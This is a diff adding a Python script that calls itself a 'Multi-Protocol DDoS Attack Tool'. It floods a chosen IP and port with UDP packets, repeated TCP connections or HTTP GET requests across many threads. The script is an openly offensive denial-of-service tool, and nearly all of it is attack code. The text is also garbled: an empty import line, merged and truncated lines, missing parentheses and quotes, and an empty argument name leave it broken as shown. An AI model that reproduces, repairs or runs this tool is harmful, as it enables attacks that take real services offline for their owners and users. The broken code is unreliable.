@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+
+import
+import random
+import threading
+import socket
+import time
+import argparse
+
+def udp_flood(target_ip, target_port, duration, threads):
+ def send_packets():
+ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM bytes = random._urandom(1024)
+ while True:
+ sock.sendto(bytes, (target_ip, target_port))
+
+ for _ in range(threads):
+ thread = threading.Thread(target=send_packets)
+ thread.start()
+
+ print(f"[*] UDP flood on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
+ try:
+ time.sleep(duration)
+ except KeyboardInterrupt:
+ pass
+ print("[*] UDP Attack finished.")
+
+def tcp_flood(target_ip, target_port, duration, threads def send_packets():
+ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ while True:
+ try:
+ sock.connect((target_ip, target_port))
+ sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode + b"\r\n\r\n")
+ sock.close()
+ except:
+ pass
+
+ for _ in range(threads):
+ thread = threading.Thread(target=send_packets)
+ thread.start()
+
+ print(f"[*] Starting TCP flood on {target_ip}:{target_port} forduration} seconds with {threads} threads.")
+ try:
+ time.sleep(duration)
+ except KeyboardInterrupt:
+ pass
+ print("[*] TCP Attack finished.")
+
+def http_flood(target_ip, target_port, duration, threads):
+ def send_packets():
+ sock = socket.socket.AF_INET, socket.SOCK_STREAM)
+ while True:
+ try:
+ sock.connect((target_ip, target_port))
+ sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
+ sock.close()
+ except:
+ pass
+
+ for _ in range(threads):
+ thread = threading.Thread(target=send_packets)
+ thread.start()
+
+ print(f"[*] Starting HTTP flood on {target_ip}:{target_port} for {duration} seconds with {threads} threads.")
+ try time.sleep(duration)
+ except KeyboardInterrupt:
+ pass
+ print("[*] HTTP Attack finished.")
+
+if __name__ == "__main__":
+ parser = argparse.ArgumentParser(description="Multi-Protocol DDoS Attack Tool")
+ parser.add_argument("target_ip", help="Target IP address parser.add_argument("target_port", type=int, help="Target port number")
+ parser.add_argument("duration", type=int, help="Duration of the attack in seconds")
+ parser.add_argument("threads", type=int, help="Number of threads to use")
+ parser.add_argument("", choices=["udp", "tcp", "http"], help="Protocol to use for the attack")
+
+ args = parser.parse_args()
+
+ if args.protocol == "udp":
+ udp_flood(args.target_ip, args.target_port, args.duration, args.threads)
+ elif args.protocol ==tcp":
+ tcp_flood(args.target_ip, args.target_port, args.duration, args.threads)
+ elif args.protocol == "http":
+ http_flood(args.target_ip, args.target_port, args.duration, args.threads)
